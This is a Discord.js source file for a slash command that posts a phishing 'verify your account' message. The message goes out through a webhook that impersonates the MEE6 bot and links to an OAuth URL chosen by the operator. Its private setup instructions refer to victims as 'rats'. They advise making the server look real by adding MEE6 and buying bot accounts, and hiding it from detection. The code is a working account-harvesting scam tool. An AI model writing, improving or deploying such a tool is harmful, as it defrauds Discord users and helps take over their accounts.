const { SlashCommandBuilder } = require("@discordjs/builders");
const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ActionRow,
  PermissionFlagsBits,
} = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("verifyembed")
    .setDescription("Sets up the verify embed")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .setDMPermission(false)
    .addStringOption((option) =>
      option
        .setName("oauthlink")
        .setDescription("The oAuth link you wanna use.")
        .setRequired(true)
    ),

  async execute(interaction, client) {
    const { options } = interaction;
    const key = options.getString("oauthlink");
    const embed = new EmbedBuilder()
      .setColor("Blue")
      .setAuthor({
        name: "Please verify your account to view the rest of the channels",
      })
      .setTitle("FAQ")
      .addFields(
        {
          name: "Why am I verifying?",
          value:
            "This is to confirm you're a real person, and not a bot joining our server to attempt to spam invite links or the like.",
        },
        {
          name: "How long does it take to verify?",
          value: "Verifying generally takes up to 60 seconds maximum.",
        },
        {
          name: "Do I have to verify?",
          value:
            "You don't have to, but to access other channels, you will need to verify to view them.",
        }
      );
    const setupembed = new EmbedBuilder()
      .setColor("Green")
      .setAuthor({ name: "Setup" })
      .addFields(
        {
          name: "#1",
          value:
            "Add MEE6 to your server to make this embed look more real, you can add it [here](https://discord.com/oauth2/authorize?response_type=code&client_id=159985415099514880&redirect_uri=https%3A%2F%2Fmee6.xyz%2Fapi%2Fdiscord-callback&scope=identify+guilds+email+applications.commands.permissions.update)",
        },
        {
          name: "#2",
          value:
            "Please do not put your server with all the rats in this server, if you do then atleast make it not an obvious name. There is a BetterDiscord extension that lets people see channels in the server.",
        },
        {
          name: "#4",
          value:
            "Buy bots, your server will look more realistic if you buy bots to make the server look more real. I would suggest [TokenU](https://beta.tokenu.net) to get bots. It is around 10$ to make your server realistic. Although this is optional.",
        },
        { name: "#3", value: "Enjoy! Enjoy your new oAuth server!" }
      );

    const failedembed = new EmbedBuilder()
      .setColor("Red")
      .setAuthor({ name: "❌ Failed" })
      .setTitle("You need to use a link!")
      .setDescription(`Fix your link!`);

    function isUrl(string) {
      const pattern =
        /[(http(s)?):\/\/(www\.)?a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/ig;
      return pattern.test(string);
    }

    if (!isUrl(key)) {
      return interaction.reply({
        embeds: [failedembed],
      });
    }
try {
    await interaction.channel
      .createWebhook({
        name: "MEE6",
        avatar:
          "https://media.licdn.com/dms/image/C560BAQFFBLU4amrCGw/company-logo_200_200/0/1567784300873?e=2147483647&v=beta&t=zJfV1vhZm4KpidYviGQZ4BP7Y-DBIhHYzgqRyX16UAs",
      })
      .then((webhook) => console.log(`Created webhook ${webhook}`))
      .catch(console.error);
    } catch (err) { console.log('There was an error with creating the webhook!' )}

    const webhooks = await interaction.channel.fetchWebhooks();
    const webhook = webhooks.find((wh) => wh.token);

    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel(`✅ Verify!`)
        .setURL(`${key}`)
        .setStyle(ButtonStyle.Link)
    );

    try {
      await webhook.send({
        embeds: [embed],
        components: [button],
      });

      interaction.reply({ embeds: [setupembed], ephemeral: true });
    } catch (err) {}
  },
};
